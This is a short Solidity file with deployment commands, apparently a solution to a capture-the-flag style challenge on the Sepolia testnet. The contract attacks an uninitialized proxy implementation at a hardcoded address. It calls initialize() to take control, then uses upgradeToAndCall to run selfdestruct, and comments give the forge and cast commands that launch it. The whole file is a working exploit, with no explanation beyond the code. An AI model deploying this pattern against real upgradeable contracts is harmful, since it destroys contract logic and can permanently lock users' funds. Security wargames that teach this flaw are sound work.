// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface Iengine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract SelfDestruct {
    Iengine target = Iengine(0x42162F7f19759c4A685fF3Fe3e0E6f8d9c282CA4);

    function burn() public {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destroy.selector));
    }

    function destroy() public {
        selfdestruct(payable(address(0)));
    }
}

// proxy address = 0xf92c56fa59Caa9487931C66240694376489e570B
// forge create SelfDestruct --rpc-url $SEPOLIA_URL --account real_account_1 --broadcast
// cast send 0xf92c56fa59Caa9487931C66240694376489e570B "upgradeToAndCall(address newImplementation, bytes memory data)" 0x89318AaF818146DA22e7F6eB2FB0f793e43F6C54 0x0000000000000000000000000000000000000000000000000000000083197ef0 --rpc-url $SEPOLIA_URL --account real_account_1
//
